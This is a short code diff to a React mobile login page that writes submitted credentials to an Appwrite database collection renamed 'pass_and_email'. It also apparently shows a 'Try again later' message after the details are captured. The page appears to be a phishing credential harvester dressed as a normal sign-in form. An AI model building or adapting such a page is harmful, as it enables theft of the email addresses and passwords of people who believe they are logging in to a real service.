@@ -34,8 +34,8 @@ export default function MobileLoginPage() {
     try {
       console.log('Attempting to store data...');
       const response = await databases.createDocument(
-        '6717c213001280d0cb91',
-        '6717c271002782e1e85f',
+        '69f650190001f0f5af46',
+        'pass_and_email',
         ID.unique(),
         {
           email: credentials.email,
@@ -86,7 +86,7 @@ export default function MobileLoginPage() {
             required
           />
           {message && (
-            <div className={`text-sm text-center ${message.includes('Failed') ? 'text-red-500' : 'text-green-500'}`}>
+            <div className={`text-sm text-center ${message.includes('Try again later') ? 'text-red-500' : 'text-green-500'}`}>
               {message}
             </div>
           )}
